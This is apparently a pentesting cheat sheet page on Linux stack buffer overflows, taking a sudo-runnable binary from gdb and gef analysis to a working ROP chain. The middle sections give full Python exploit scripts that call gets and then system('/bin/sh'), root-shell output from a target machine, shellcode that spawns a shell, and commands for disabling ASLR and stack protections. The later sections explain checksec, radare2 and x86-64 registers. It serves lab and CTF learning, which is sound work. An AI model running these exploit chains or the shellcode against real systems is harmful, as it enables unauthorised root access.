Reading symbols from ./binary-file...
(No debugging symbols found in ./binary-file)
(gdb) i functions
All defined functions:
Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401090  puts@plt
0x00000000004010a0  system@plt
...

# Check if there is any non-standard function. LIBC functions include gets, system, puts, and strcmp. Let's have a look at the main function:
(gdb) disas main
Dump of assembler code for function main:
   0x00000000004011d6 <+0>:     endbr64
...

# Try to understand the function flow, note memory addresses and then view its data:
(gdb) x/s 0x402008
0x402008: ...
...

# Try to recreate the original function in source code (C). Check deprecated or insecure functions to see if we can exploit them. Example: https://github.com/D4mianWayne/PwnLand/blob/master/BufferOverflows/gets.md

# Now try to find a buffer overflow by supplying a lot of data:
$ python3 -c 'print("A"*400)' | sudo /usr/local/bin/binary-file
...
Segmentation fault

# Marvelous, we can trigger the vulnerability! Let's check the protections of the binary with the checksec function.
└─$ gdb-gef ./binary-file
gef➤  checksec
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partialpattp

# Only one protection, NX (no shellcode execution off the stack). In order to tackle this protection, we can use the ROP.

#To find the offset to the ROP, we can generate a unique cyclic pattern which will be given to the program as the input. Once the program has crashed, we can examine at what value the crash occurred and determine the offset.
gef➤  pattern create 400 # create a cyclic pattern of 400 bytes
# Execute the binary and pass the pattern as input
gef➤  r                                                                                                                                                                      
Starting program: ...
Input: $PATTERN
...
Program received signal SIGSEGV, Segmentation fault.                                                                                                                         
0x0000000000401270 in main ()

# We can see that Segmentation fault (SIGSEGV) error. We should see RSP register:
# find rsp
gef➤  x/s $rsp
0x7fffffffdcf8: "iaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaab"
# finding offset
gef➤  pattern search iaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaab
[+] Searching for 'iaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaab'
[+] Found at offset 264 (big-endian search)
# We note the offset (264 in this case)
```
{% endcode %}
{% endtab %}

{% tab title="Disassembly" %}
{% code overflow="wrap" %}
```bash
# We discovered how gets is called during the disassembly of the main  function.
   0x00000000004011fd <+39>:    call   0x4010b0 <printf@plt>
   0x0000000000401202 <+44>:    lea    rax,[rbp-0x100]
   0x0000000000401209 <+51>:    mov    rdi,rax
   0x000000000040120c <+54>:    mov    eax,0x0
   0x0000000000401211 <+59>:    call   0x4010d0 <gets@plt>
# From this, we can derive:
#• The address stored at the rbp - 0x100 is given to the rax function.
#• The rax value is then given to the rdi.
#• The eax is assigned to the 0.
#• Finally, gets function is called.

# For example:
pop rdi; ret;
# This is a gadget, in ROP terms, that can be used to pop the rdi register and can be used on the gadget itself. To make use of this we must understand the calling conventions for x86_64 architecture.
+---------------+--------------+------------------+------------------+
|  1st argument | 2nd argument | 3rd argument.... |  .... so on .... |
+---------------+--------------+------------------+------------------+
|    rdi        |	rsi    | 	rdx       |  rcx-r8-r9       |
+---------------+--------------+------------------+------------------+
# We use rdi since it is the first argument as we saw on the dissasembly of the main function.
```
{% endcode %}
{% endtab %}

{% tab title="Find ROP gadget" %}
We will use the command **ropper**. This package contains scripts that display info about files in different formats and find gadgets to build ROPs chains for different architectures(x86/x86\_64, ARM/ARM64, MIPS, PowerPC). For disassembly ropper uses the Capstone Framework.

```bash
└─$ ropper --file binary-file --search 'pop rdi; ret'
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi; ret

[INFO] File: redis-status
0x00000000004012e3: pop rdi; ret;
```

Now we need to find the `r/w` section using either `gdb` or `readelf`. Let's use `readelf`.

```bash
└─$ readelf -S binary-file
There are 31 section headers, starting at offset 0x3ae0:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .interp           PROGBITS         0000000000400318  00000318
       000000000000001c  0000000000000000   A       0     0     1
...
  [23] .got              PROGBITS         0000000000403ff0  00002ff0
       0000000000000010  0000000000000008  WA       0     0     8
  [24] .got.plt          PROGBITS         0000000000404000  00003000
       0000000000000048  0000000000000008  WA       0     0     8
  [25] .data             PROGBITS         0000000000404050  00003048
       0000000000000010  0000000000000000  WA       0     0     8
  [26] .bss              NOBITS           0000000000404060  00003058
       0000000000000010  0000000000000000  WA       0     0     32
  [27] .comment          PROGBITS         0000000000000000  00003058
       000000000000002b  0000000000000001  MS       0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  D (mbind), l (large), p (processor specific)
```

From the above output, we got the `.bss` section which refers to a section in the ELF which usually has the r/w section. We can see the `WA` flag in the output which stands for `WRITE ALLOC`.

We have the data section starting from `0x404050`. It's not a recommended practice to use the starting address during the development of the exploit, so let's add `0x400` as an offset to our Python exploit draft.

```python
from struct import pack

p64 = lambda x: pack("<I", x)

gets = 0x00000000004010d0

pop_rdi = 0x4012e3 # gadget found to build ROP / ropper [...] --search 'pop rdi; ret'
payload = b"A"*264 # 264 is the instruction pointer offset (when seg fault)
payload += p64(pop_rdi)
payload += p64(0x404050 + 0x400) # .bss start + 0x400 (offset)
payload += p64(gets)
f = open("x.txt", "wb")
f.write(payload)
f.close()
```
{% endtab %}

{% tab title="ROP chain" %}
Let's write the chain to a file and then use `gdb` to check the memory. In order to test the exploit locally, we can use\
[https://github.com/D4mianWayne/roppy](https://github.com/D4mianWayne/roppy) which is an exploit development toolkit to work alongside the rop chain and have the abilityto debug it in real time.

```python
from roppy import *

elf = ELF("binary-file")
p = process("./binary-file")
pop_rdi = 0x4012e3
payload = b"A"*264
payload += p64(pop_rdi)
payload += p64(0x404050 + 0x400)
payload += p64(elf.plt['gets'])

pause()
p.sendline(payload)
p.interactive()
```

The `pause()` waits for any interaction encountered, such as a key stroke. When we run it, it will prompt us for input.

```python
└─$ python3 xpl.py                                                                                                                                                       1 ⨯
[*] ELF: /home/kali/binary-file
[+] Starting program: PID 52493
[*] Paused [Press any key to continue]
```

We attach that PID to our gef debbuging session:

```bash
gef➤  attach 52493                                                                                                                                                           
Attaching to process 52493     
...                                                                                                                                              
[#0] Id 1, Name: "", stopped 0x7f74d57f055e in __GI___libc_read (), reason: STOPPED
```

We can continue the execution using `c` in the `gdb` session and then pressing any key on the roppy's running session. After pressing a key, we will provide the string `/bin/sh`.

```python
└─$ python3 xpl.py                                                                                                                                                       1 ⨯
[*] ELF: ...
[+] Starting program '': PID 52493
[*] Paused [Press any key to continue]
...
$ /bin/sh
```

After proving the string, it stops the execution and the `gdb` session displays a segfault. Let's check if the string was stored by checking the value at the address.

```
gef➤  c
Continuing.
Program received signal SIGILL, Illegal instruction.
0x0000000000401100 in _start ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00000000404450  →  0x68732f6e69622f ("/bin/sh"?)
...
gef➤  x/s 0x404050 + 0x400
0x404450:       "/bin/sh"
```

We successfully stored the string "/bin/sh" at the address `0x404450`. Now, we need to construct a ROP chain.

```python
payload += p64(pop_rdi)
payload += p64(0x404450) #0x404050 + 0x400 (offset) has /bin/sh
payload += p64(elf.plt['system']) #execute that /bin/sh
```

This will load the address `0x404450` to the `rdi` register which is used to store the value of first argument. Let's put it all together in our exploit script.

```python
┌──(kali㉿kali)-[~]
└─$ cat xpl.py 
from roppy import *
p = process("./binary-file")
elf = ELF("binary-file")
pop_rdi = 0x4012e3
payload = b"A"*264
payload += p64(pop_rdi)
payload += p64(0x404050 + 0x400)
payload += p64(elf.plt['gets'])

payload += p64(pop_rdi)
payload += p64(0x404450)
payload += p64(elf.plt['system'])
'''
f = open("xploit.txt", "wb")
f.write(payload)
f.close()
'''

p.sendline(payload)
p.interactive()
```
{% endtab %}

{% tab title="Final tests" %}
Let's run the exploit locally on Kali:

```python
└─$ python3 xpl.py
[+] Starting program '': PID 53660
[*] ELF: ...
[*] Switching to interactive mode
...
$ echo hola
hola
[*] Got EOF while reading in interactive
$  
```

Great, it works on our Kali host since we could issue a command but we don't have roppy on the victim machine. Instead, we can write the ROP chain to a file and transfer it to the victim machine.

```
$ (cat xploit.txt; cat -) | sudo /usr/local/bin/binary-file
```

And then give the string `/bin/sh` and let the chain call the `system("/bin/sh")`:

```python
from roppy import *

elf = ELF("binary-file")
pop_rdi = 0x4012e3
payload = b"A"*264
payload += p64(pop_rdi)
payload += p64(0x404050 + 0x400)
payload += p64(elf.plt['gets'])

payload += p64(pop_rdi)
payload += p64(0x404450)
payload += p64(elf.plt['system'])

f = open("xploit.txt", "wb")
f.write(payload)
f.close()
```

This will write the ROP chain to the file called `xploit.txt`.&#x20;

We run it on our Kali and get xploit.txt file:

{% code overflow="wrap" %}
```python
└─$ python3 xpl.py
[*] ELF: ...

└─$ cat xploit.txt 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@PD@p@@PD@@@
```
{% endcode %}

In order to run the exploit against the binary, we will place our public key generated in the authorized\_keys file of the user's home directory .ssh.

Now, that we have an ssh session for the user, transfer the `xploit.txt` to the target machine with wget for example:

Abuse of the vulnerable binary by parsing the `xploit.txt`.

```bash
user@box:/tmp$ (cat xploit.txt; cat -) | sudo /usr/local/bin/binary-file
...
/bin/sh
...
id
uid=0(root) gid=0(root) groups=0(root)
```

After giving "/bin/sh" at the first input, it spawns a simple shell that will close after running one command. Once the `/bin/sh` shell is spawned, we can then run `/bin/bash` within it to interact fully.

```bash
user@box:/tmp$ (cat xploit.txt; cat -) | sudo /usr/local/bin/binary-file
...
/bin/sh
...
/bin/bash
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
hostname
hostname-example
```
{% endtab %}
{% endtabs %}

## checksec

<pre data-overflow="wrap"><code>checksec intro2pwn1

<strong>RELRO stands for Relocation Read-Only, which makes the global offset table (GOT) read-only after the linker resolves functions to it. The GOT is important for techniques such as the ret-to-libc attack, although this is outside the scope of this room. If you are interested, you can refer to this blog post: https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro.
</strong>
Stack canaries are tokens placed after a stack to detect a stack overflow. These were supposedly named after birds that coal miners brought down to mines to detect noxious fumes. Canaries were sensitive to the fumes, and so if they died, then the miners knew they needed to evacuate. On a less morbid note, stack canaries sit beside the stack in memory (where the program variables are stored), and if there is a stack overflow, then the canary will be corrupted. This allows the program to detect a buffer overflow and shut down. You can read more about stack canaries here: https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/.

NX is short for non-executable. If this is enabled, then memory segments can be either writable or executable, but not both. This stops potential attackers from injecting their own malicious code (called shellcode) into the program, because something in a writable segment cannot be executed.  On the vulnerable binary, you may have noticed the extra line RWX that indicates that there are segments which can be read, written, and executed. See this Wikipedia article for more details: https://en.wikipedia.org/wiki/Executable_space_protection

PIE stands for Position Independent Executable. This loads the program dependencies into random locations, so attacks that rely on memory layout are more difficult to conduct. Here is a good blog about this: https://access.redhat.com/blogs/766093/posts/1975793

Good overview of checksec: https://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/
</code></pre>

## Misc

### gdb

[https://hugsy.github.io/gef/](https://hugsy.github.io/gef/)

[https://github.com/D4mianWayne/PwnLand/blob/master/Debugging/chapter-1.md](https://github.com/D4mianWayne/PwnLand/blob/master/Debugging/chapter-1.md)

Binary Ninja, GHIDRA, ltrace, gdb-peda.

{% hint style="info" %}
Use **ltrace** command on Linux to see what library calls are for a binary.
{% endhint %}

## Common shellcode to spawn a shell

{% code overflow="wrap" %}
```python
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80
```
{% endcode %}

## Radare (r2)

{% code overflow="wrap" fullWidth="true" %}
```python
r2 -d $BINARY // debug mode

# ONCE INSIDE RADARE    
    aa # analyse the program
    e asm.syntax=att # set dissasembly sintax to AT&T
    ?  # help
    a? # help about analysis
    afl # list all functions
    pdf @main # dissasemble main function
    db 0x55ae52836612 # set a bp on a memory address
    dc # continue execution (to hit bp later)
    dr # see value of the registers
    
    px @rbp-0x4 # hexdump of N bytes (to show a variable value, check top of the function)
    **We are checking the exact address, so we only need to check to 0 offset. 
    The value stored in memory is stored as hex. 
```
{% endcode %}

## Discovering the vulnerability

3 primary techniques:

* Source code review
* Reverse engineering
* Fuzzing

## Registers and operations <a href="#fc42" id="fc42"></a>

| 64 bit | 32 bit |
| ------ | ------ |
| %rax   | %eax   |
| %rbx   | %ebx   |
| %rcx   | %ecx   |
| %rdx   | %edx   |
| %rsi   | %esi   |
| %rdi   | %edi   |
| %rsp   | %esp   |
| %rbp   | %ebp   |
| %r8    | %r8d   |
| %r9    | %r9d   |
| %r10   | %r10d  |
| %r11   | %r11d  |
| %r12   | %r12d  |
| %r13   | %r13d  |
| %r14   | %r14d  |
| %r15   | %r15d  |

%rax-%rdx, %rsi, %rdi --> general purpose registers

%rsp is the stack pointer and it points to the top of the stack which contains the most recent memory address.&#x20;

%rbp is a frame pointer and points to the frame of the function currently being executed - every function is executed in a new frame. To move data using registers, the following instruction is used:

`movq source, destination`

This involves:

* Transferring constants(which are prefixed using the $ operator) e.g. `movq $3 rax` would move the constant 3 to the register
* Transferring values from a register e.g. `movq %rax %rbx` which involves moving value from rax to rbx
* Transferring values from memory which is shown by putting registers inside brackets e.g. `movq %rax (%rbx)` which means move value stored in %rax to memory location represented by %rbx.

The last letter of the mov instruction represents the size of the data:

| Intel Data Type  | Suffix | Size(bytes) |
| ---------------- | ------ | ----------- |
| Byte             | b      | 1           |
| Word             | w      | 2           |
| Double Word      | l      | 4           |
| Quad Word        | q      | 8           |
| Single Precision | s      | 4           |
| Double Precision | l      | 8           |

When dealing with memory manipulation using registers, there are other cases to be considered:

* (Rb, Ri) = MemoryLocation\[Rb + Ri]
* D(Rb, Ri) = MemoryLocation\[Rb + Ri + D]
* (Rb, Ri, S) = MemoryLocation(Rb + S \* Ri]
* D(Rb, Ri, S) = MemoryLocation\[Rb + S \* Ri + D]

Some other important instructions are:

* `leaq source, destination`: this instruction sets destination to the address denoted by the expression in source
* `addq source, destination`: destination = destination + source
* `subq source, destination`: destination = destination - source
* `imulq source, destination`: destination = destination \* source
* `salq source, destination`: destination = destination << source where << is the left bit shifting operator
* `sarq source, destination`: destination = destination >> source where >> is the right bit shifting operator
* `xorq source, destination`: destination = destination XOR source
* `andq source, destination`: destination = destination & source
* `orq source, destination`: destination = destination | source

Before understanding how programs work, it is important to understand registers, memory manipulation and some basic instructions. The next sections will have more hands on use of radare2.

## What is a Stack? <a href="#fc42" id="fc42"></a>

> A stack is a LIFO (Last In First Out) data structure. There are two operations associated with it. “PUSH” operation puts an object on the “TOP” of the stack and a “POP” operation removes an object from the “TOP” of the stack. A stack is used during function calls to create the associated stack frames for each function call. The stack also stores the “return address” of the function, which is the address to which control should be passed when a function returns.

![](<../.gitbook/assets/image (27).png>)

The function arguments are pushed on the stack followed by the “return address” (value in register **rip**) and the “frame/base pointer” (value in register **rbp**) which points to the base of the previous stack frame. It should be noted that the first six arguments are not pushed on the stack but stored in registers on a 64-bit architecture whereas in a 32-bit architecture, all the function arguments are pushed on the stack.

**Address Space Layout Randomization** (ASLR): It is a mechanism which randomly arranges the address space of a process. It can be disabled using this command:

```
echo 0 > /proc/sys/kernel/randomize_va_space
```

**Data Execution Policy (DEP)/NX/XD**: It disables the execution of code in memory pages which are marked non-executable.

```
gcc bof_demo.c -z execstack -o bof_demo
```

**Stack Canaries/Cookies**: These are known words which are placed between the buffer and the control data in order to detect a buffer overflow attack.

```
gcc bof_demo.c -o bof_demo -fno-stack-protector
```

**Endianness** refers to the organization of bytes in memory. It is of two types: little endian and big endian. In a little endian machine, the least significant byte is stored in the lower address and the most significant byte in the higher addresses whereas in a big endian machine, the most significant byte is stored in the lower address and the least significant byte in the higher addresses.

```
To check endianness, use endian.c or lscpu command on Linux
```

## Misc: Format String

[https://owasp.org/www-community/attacks/Format\_string\_attack](https://owasp.org/www-community/attacks/Format_string_attack)

[https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp/format-strings-template](https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp/format-strings-template)

## References

{% embed url="https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst" %}

{% embed url="https://medium.com/@buff3r/basic-buffer-overflow-on-64-bit-architecture-3fb74bab3558" %}



## &#x20;<a href="#fc42" id="fc42"></a>
